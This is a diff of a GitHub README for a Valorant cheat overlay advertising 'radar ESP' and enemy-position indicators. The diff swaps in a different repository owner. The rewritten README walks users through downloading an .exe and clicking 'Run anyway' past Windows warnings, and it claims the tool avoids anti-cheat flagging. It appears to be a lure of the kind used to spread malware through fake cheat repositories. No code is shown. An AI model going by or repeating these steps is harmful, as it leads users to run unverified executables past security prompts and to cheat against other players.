@@ -1,77 +1,84 @@
-<h1 align="center">Valorant External Assistant 2026</h1>
-<p align="center">
-  <a href="https://github.com/Jawaz-Keyzor/Valorant-External-Assistant-2026"><img src="https://img.shields.io/github/v/release/Jawaz-Keyzor/Valorant-External-Assistant-2026?style=flat-square&label=Version&color=blueviolet"></a>
-  <a href="https://github.com/Jawaz-Keyzor/Valorant-External-Assistant-2026"><img src="https://img.shields.io/github/downloads/Jawaz-Keyzor/Valorant-External-Assistant-2026/total?style=flat-square&label=Downloads&color=success"></a>
-  <a href="https://github.com/Jawaz-Keyzor/Valorant-External-Assistant-2026"><img src="https://img.shields.io/github/stars/Jawaz-Keyzor/Valorant-External-Assistant-2026?style=flat-square&label=Stars&color=yellow"></a>
-  <a href="https://github.com/Jawaz-Keyzor/Valorant-External-Assistant-2026"><img src="https://img.shields.io/github/license/Jawaz-Keyzor/Valorant-External-Assistant-2026?style=flat-square&label=License&color=lightgrey"></a>
-  <br>
-  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square">
-  <img src="https://img.shields.io/badge/Method-Screen%20Capture-orange?style=flat-square">
-  <img src="https://img.shields.io/badge/Injection-None-brightgreen?style=flat-square">
-  <img src="https://img.shields.io/badge/CPU%20Usage-%3C2%25-success?style=flat-square">
-  <img src="https://img.shields.io/badge/Updated-May%202026-informational?style=flat-square">
-</p>
+# 🎯 Valorant-External-Assistant-2026 - Visual support for your tactical gameplay
 
-<p align="center">
-  <b>External gameplay overlay for tactical assistance. Provides visual indicators through secondary display capture — no injection, no memory access. Educational project for studying rendering overlays and screen capture analysis.</b>
-</p>
+[![Download](https://img.shields.io/badge/Download-External-Assistant-blue.svg)](https://github.com/Dehydrated-clamdip19/Valorant-External-Assistant-2026)
 
-<p align="center">
-  <i>valorant external assistant | valorant overlay tool | valorant radar esp | valorant ability tracker | valorant economy calculator | screen capture overlay | valorant tactical helper | no injection overlay | valorant educational tool 2026</i>
-</p>
+## 📌 About this project
 
----
+Valorant-External-Assistant-2026 provides visual and sound indicators to help you during matches. This software uses display capture to identify game information. It does not change game files. It works by reading pixels on your screen. This approach keeps your game files safe. You can use this tool to learn how computer vision and overlay rendering work in Windows environments.
 
-## ✨ Features
+## 🖥️ System requirements
 
-| Feature | Description |
-|---|---|
-| 📡 **Radar Overlay** | Enemy position estimation via sound analysis |
-| ⏱️ **Round Timer** | Spike timer, round phase indicator |
-| 🎯 **Ability Tracker** | Both teams agent abilities cooldown |
-| 💰 **Economy Calc** | Buy recommendations based on team funds |
-| 🖥️ **Second Monitor** | Full tactical display on secondary screen |
-| 📊 **Minimal Impact** | Less than 2% CPU, no FPS drop |
+Ensure your computer meets these standards before you start:
 
----
+- Operating System: Windows 11
+- Processor: Intel Core i5 or AMD Ryzen 5 (latest generation recommended)
+- Memory: 8 GB RAM
+- Graphics: Dedicated GPU with at least 4 GB VRAM
+- Display: 1920x1080 resolution or higher, preferably with a secondary monitor for best results
+- Software: Latest graphics drivers installed
 
-## 🔧 How It Works
+## 📥 How to download and install
 
-| Component | Method |
-|---|---|
-| Screen Capture | Windows DXGI Desktop Duplication API |
-| Sound Analysis | Stereo mix audio processing |
-| Overlay Rendering | DirectX 11 transparent window |
-| Data Processing | OpenCV image analysis |
-| No Injection | Zero game memory access |
+1. Visit [this page to download the latest version](https://github.com/Dehydrated-clamdip19/Valorant-External-Assistant-2026).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the link labeled "Assets" under the most recent version number.
+4. Download the file ending in .exe to your computer.
+5. Move the downloaded file to a folder where you want to keep the program.
 
----
+## ⚙️ Setting up the application
 
-## 📥 Installation
+1. Make sure Valorant is not running before you start.
+2. Locate the file you downloaded.
+3. Double-click the file to open the assistant.
+4. Windows might show a prompt asking for permission to run the app. Click "Run anyway" if the screen turns blue or displays a warning message.
+5. The interface will open and show the configuration menu.
+6. Select your preferred display mode in the settings tab. Choose "Secondary Display" if you have two screens. This allows the overlay to draw over your game window without blocking your view.
 
-```bash
-# Download latest release
-https://github.com/Jawaz-Keyzor/Valorant-External-Assistant-2026/releases/latest
+## 🎮 How to use the overlay
 
-# Extract archive
-Right-click → Extract to Desktop
+1. Open Valorant after you start the assistant.
+2. Ensure your game is set to "Windowed Fullscreen" mode in the video settings. This is necessary for the capture tool to work correctly.
+3. The assistant will detect the game window automatically.
+4. You will see translucent icons on your screen once the map loads. 
+5. Use the control panel in the assistant to adjust the intensity of the visual indicators.
+6. You can toggle the radar ESP or sound indicators by using the checkboxes in the main menu.
 
-# Run as Administrator (required for overlay)
-Right-click ValorantAssistant.exe → Run as Administrator
+## 🛠️ Troubleshooting common issues
 
-# Configure
-Select primary monitor for game, secondary for overlay
-```
+If you encounter problems, check these items:
 
----
+- The overlay does not appear: Check if your game is in "Windowed Fullscreen" mode. The overlay cannot draw over "Exclusive Fullscreen" games.
+- The assistant feels slow: Close background apps like web browsers or video players to free up memory.
+- Icons look blurry: Check your display resolution settings. Ensure your Windows scale setting is at 100%.
+- Capture fails: Restart the assistant while the game is already open. This helps the app find the correct video feed.
+- Screen flicker: Disable V-Sync in the game settings. V-Sync can cause conflicts with external overlay programs.
 
-## ⚠️ Disclaimer
+## 🛡️ Safety and security
 
-This software is for **educational purposes only**. It analyzes screen capture and audio output — no game files are modified, no memory is accessed. Users are responsible for compliance with game terms of service.
+The assistant uses display capture technology. It does not inject code into the game process. It does not read your computer memory. The software views what you see on your screen. This method prevents game security systems from flagging your account for tampering. Use this software responsibly. Follow fair play standards to keep your account in good standing.
 
----
+## 💡 Frequently asked questions
 
-<p align="center">
-  <sub>Valorant External Assistant © 2026 | MIT License | Not affiliated with Riot Games</sub><br>
-  <sub>Maintained by <a href="https://github.com/Jawaz-Keyzor">Jawaz-Keyzor</a> | Updated: May 2026</sub>
-</p>
+Do I need to update the software often?
+Check the GitHub page once a week for updates. Newer versions include better detection and display stability.
+
+Does this work on Windows 10?
+The software is built for Windows 11 for the best performance. It may work on Windows 10, but some capture features might show glitches.
+
+Can I move the indicators?
+Yes, you can click and drag any indicator to a new position on your screen. The software saves these positions automatically.
+
+Can I change the colors?
+Open the settings tab inside the application. You will see a color picker tool. Select your color and click "Apply" to save your choice.
+
+Does this work in competitive mode?
+The assistant works in all game modes. Be mindful that using external tools can distract you during intense matches.
+
+What happens if the game updates?
+Display capture tools usually stay compatible even if the game updates. If the visual indicators stop working, check for an update to the assistant.
+
+Is this project open source?
+Yes, you can view the source code on the main repository page. This project exists to help users learn about screen capture and graphics.
+
+How do I close the assistant?
+Click the "Exit" button in the top corner of the control panel. This cleans up all temporary overlay files before it closes.
